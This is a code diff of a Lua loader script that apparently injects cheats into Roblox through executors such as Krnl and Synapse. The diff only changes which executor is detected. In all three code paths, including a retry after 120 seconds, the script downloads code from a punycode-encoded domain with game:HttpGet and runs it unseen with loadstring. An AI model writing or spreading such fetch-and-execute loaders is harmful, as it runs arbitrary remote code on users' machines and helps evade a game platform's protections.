@@ -7,7 +7,7 @@ local success,err = pcall(function()
         repeat wait(0.25) until game.Players.LocalPlayer.Loaded.Value == true
     end
     getgenv().Key = "%s"
-    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
+    local Exploit = KRNL_LOADED and "Krnl" or "Synapse"
     loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
 end)
 if (not success) then
@@ -19,11 +19,11 @@ if (not success) then
         repeat wait(0.25) until game.Players.LocalPlayer.Loaded.Value == true
     end
     getgenv().Key = "%s"
-    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
+    local Exploit = KRNL_LOADED and "Krnl" or "Synapse"
     loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
 end
 wait(120)
 if not getgenv().ScriptReady then
-    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
+    local Exploit = KRNL_LOADED and "Krnl" or "Synapse"
     loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
 end
